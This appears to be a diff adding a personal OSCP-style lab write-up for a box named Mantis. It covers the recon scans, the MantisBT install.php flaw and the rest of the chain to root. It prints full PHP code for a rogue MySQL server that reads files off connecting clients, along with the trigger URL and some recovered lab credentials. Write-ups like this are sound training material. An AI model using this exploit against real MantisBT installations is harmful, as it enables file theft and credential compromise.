@@ -1,0 +1,272 @@
+**Start 09:12 07-02-2025**
+
+---
+```
+Scope:
+192.168.192.204
+```
+# Recon
+
+## Nmap
+
+```bash
+sudo nmap -sC -sV -vvvv -Pn -p- mantis -sT --min-rate=5000 -T5
+
+PORT     STATE SERVICE REASON  VERSION
+80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-favicon: Unknown favicon MD5: 6DC825C260AFEEA86DFCFEE3B99F13BF
+|_http-title: Slick - Bootstrap 4 Template
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+3306/tcp open  mysql   syn-ack MariaDB 5.5.5-10.3.34
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
+|   Thread ID: 35
+|   Capabilities flags: 63486
+|   Some Capabilities: LongColumnFlag, Support41Auth, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsCompression, SupportsLoadDataLocal, SupportsTransactions, Speaks41ProtocolNew, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, FoundRows, ConnectWithDatabase, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
+|   Status: Autocommit
+|   Salt: yY1(t4A-\gr(i^xa\+^w
+|_  Auth Plugin Name: mysql_native_password
+```
+
+![](../../../assets/cc0df94c16f94911451b07c1a42197e5.png)
+
+Let's use `feroxbuster` to check directories.
+
+
+## Feroxbuster
+
+```bash
+feroxbuster --url http://mantis --force-recursion --filter-status 404 503
+```
+
+![](../../../assets/6ee3fc31cf606bf3cb892c704c1d1a4c.png)
+
+From the output (and the name of the box) it seems that the software port `80` is running is **Mantis Bugtracker**
+
+![](../../../assets/22da0369ef1773fc0a277ceefcd33457.png)
+
+Heading to the `/bugtracker/admin` endpoint gives us a login page which I tried to access using the default `administrator - root` creds, but that didn't work.
+
+![](../../../assets/417fab94a3ac651efaace19e246ea4b7.png)
+
+Since I was getting stuck now I ran `gobuster` for good measure and found the following:
+
+## Gobuster
+
+![](../../../assets/4fdbbc7c7a94e2da620366b9c58d0753.png)
+
+The `/install.php` endpoint looks promising.
+
+
+# 80/TCP - HTTP
+
+![](../../../assets/9771249ea887e0b4581501ffb10c428a.png)
+
+In the section at the bottom we can click the following button which brings us to another page:
+
+![](../../../assets/fd333a0256d55ae721e86a5f4c87127f.png)
+
+![](../../../assets/8e5627bfbdd5c76cf72879beeabae4d3.png)
+
+This part really looks promising:
+
+![](../../../assets/cd673a5b9aeacadaac31e0bd6f3d3a95.png)
+
+After some digging I found [this article](https://mantisbt.org/bugs/view.php?id=23173) concerning this vulnerability.
+
+>[!quote]
+>"After successful installation of bug tracker, it doesn't remove install.php script because of that attacker can read any file on the remote system through some installation process steps.  
+The problem is complex and exists inside MySQL server and PHP to MySQL drivers."
+
+
+## MySQL LFI
+
+![](../../../assets/e61aec3264035316603ea4dcbfb33b34.png)
+
+We will be using the [mentioned payload](https://github.com/allyshka/Rogue-MySql-Server/blob/master/roguemysql.php):
+
+```php
+<?php
+function unhex($str) { return pack("H*", preg_replace('#[^a-f0-9]+#si', '', $str)); }
+
+$filename = "/etc/passwd";
+
+$srv = stream_socket_server("tcp://0.0.0.0:3306");
+
+while (true) {
+  echo "Enter filename to get [$filename] > ";
+  $newFilename = rtrim(fgets(STDIN), "\r\n");
+  if (!empty($newFilename)) {
+    $filename = $newFilename;
+  }
+
+  echo "[.] Waiting for connection on 0.0.0.0:3306\n";
+  $s = stream_socket_accept($srv, -1, $peer);
+  echo "[+] Connection from $peer - greet... ";
+  fwrite($s, unhex('45 00 00 00 0a 35 2e 31  2e 36 33 2d 30 75 62 75
+                    6e 74 75 30 2e 31 30 2e  30 34 2e 31 00 26 00 00
+                    00 7a 42 7a 60 51 56 3b  64 00 ff f7 08 02 00 00
+                    00 00 00 00 00 00 00 00  00 00 00 00 64 4c 2f 44
+                    47 77 43 2a 43 56 63 72  00                     '));
+  fread($s, 8192);
+  echo "auth ok... ";
+  fwrite($s, unhex('07 00 00 02 00 00 00 02  00 00 00'));
+  fread($s, 8192);
+  echo "some shit ok... ";
+  fwrite($s, unhex('07 00 00 01 00 00 00 00  00 00 00'));
+  fread($s, 8192);
+  echo "want file... ";
+  fwrite($s, chr(strlen($filename) + 1) . "\x00\x00\x01\xFB" . $filename);
+  stream_socket_shutdown($s, STREAM_SHUT_WR);
+  echo "\n";
+
+  echo "[+] $filename from $peer:\n";
+
+  $len = fread($s, 4);
+  if(!empty($len)) {
+    list (, $len) = unpack("V", $len);
+    $len &= 0xffffff;
+    while ($len > 0) {
+      $chunk = fread($s, $len);
+      $len -= strlen($chunk);
+      echo $chunk;
+    }
+  }
+
+  echo "\n\n";
+  fclose($s);
+}
+```
+
+And we need to supply the following URL:
+
+```bash
+http://mantis/bugtracker/admin/install.php?install=3&hostname=192.168.45.228
+```
+
+Which we can do either via `curl`, or the website itself.
+
+This will look as follows:
+
+![](../../../assets/8e5ef89444f1d88f478ac5c7842871d2.png)
+
+![](../../../assets/c93ec3a461e8ae8df4a7178484a0149e.png)
+
+![](../../../assets/f03881d980b3cf7f20ebd12b0856b04b.png)
+
+This way we can go ahead and get the previously mentioned config file `config/config_inc.php` which will most likely be in the web root.
+
+![](../../../assets/da43f28c42725a32d6f4f461ca217a06.png)
+
+Awesome
+
+```
+root
+SuperSequelPassword
+```
+
+>[!fail]
+>In order to log in I had to add the `--skip_ssl` tag to my command:
+>![](../../../assets/ad4eb410157e73752591fbd8d3484c30.png)
+
+
+# 3306/TCP - MySQL
+
+![](../../../assets/1a6ec9ab0e2be5c808b5a4a4979b3af6.png)
+
+From here on I had to find the user info.
+
+```SQL
+USE bugtracker;
+SHOW tables;
+```
+
+![](../../../assets/d7c7aad91d3e473dae710220aa2090de.png)
+
+![](../../../assets/577be8f3149fac7dc4ab687a91e98be7.png)
+
+Let's crack it:
+
+![](../../../assets/c7af8c17529fc328661d8c4629ee3622.png)
+
+```
+administrator
+prayingmantis
+```
+
+We can now log in on the admin page:
+
+![](../../../assets/20cf9f01e7cf14cd6bdcb3e7ca2eb7a8.png)
+
+From here on I had to find a way to get RCE.
+
+
+# Foothold
+
+I looked up the following:
+
+![](../../../assets/bf7b1e45fce9bcbbb942b2381d5579e2.png)
+
+![](../../../assets/a4ab18be9f05688cbd4b079d90e56282.png)
+
+Let's follow the instructions.
+
+
+## Steps
+
+![](../../../assets/d5de4d60bc15ea8a4f10fe1c2ff32739.png)
+
+![](../../../assets/26311d3c3bda2f7c0d25451935d0c704.png)
+
+![](../../../assets/a2d1ba9862700c225dd275c28ded5def.png)
+
+![](../../../assets/632167bb7018c3b26d18f20ecc68ae01.png)
+
+Once created it should look like this:
+
+![](../../../assets/a331752ead3d0c211023d345720c334d.png)
+
+Now we simply need to go to the following URL:
+
+```
+http://mantis/bugtracker/workflow_graph_img.php
+```
+
+![](../../../assets/6ec38e85233fd98adce9057b21cbc694.png)
+
+
+### local.txt
+
+![](../../../assets/a15b5ac9e2450c50508b7e4ff2834d79.png)
+
+
+# Lateral Movement
+
+After `linpeas.sh` wasn't succesful I downloaded over `pspy` and let it run, when it showed me the following output:
+
+![](../../../assets/a3778822e67036c072dac9e54403501e.png)
+
+We now were most likely able to use this password to log in as the *mantis* user, if they reuse the password.
+
+![](../../../assets/f430dc8d55fbd6e44e824b6c5311f5f3.png)
+
+Awesome, let's check out `sudo -l` privileges.
+
+![](../../../assets/3d89ef8ef181293ea374476f640e6f62.png)
+
+Hell yeah, let's get `proof.txt`.
+
+
+## Priv Esc & proof.txt
+
+![](../../../assets/8918510b945d1bd7656c8d9b953a7603.png)
+
+---
+
+**Finished 10:44 07-02-2025**
+
+[^Links]: [[OSCP Prep]]
+
